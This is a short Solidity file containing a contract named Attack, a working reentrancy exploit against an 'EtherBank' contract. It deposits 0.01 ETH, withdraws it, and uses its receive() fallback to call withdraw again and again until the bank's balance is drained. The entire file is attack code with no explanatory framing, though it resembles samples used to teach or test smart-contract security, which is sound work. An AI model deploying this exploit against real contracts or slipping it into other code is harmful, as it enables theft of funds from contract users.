// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IEtherBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attack {
    IEtherBank public bank;

    uint256 public constant ATTACK_AMOUNT = 0.01 ether;

    constructor(address _bank) {
        bank = IEtherBank(_bank);
    }

    receive() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            bank.withdraw(ATTACK_AMOUNT);
        }
    }

    function attack() external payable {
        require(msg.value == ATTACK_AMOUNT, "Send exactly 0.01 ETH");

        bank.deposit{value: ATTACK_AMOUNT}();
        bank.withdraw(ATTACK_AMOUNT);
    }
}
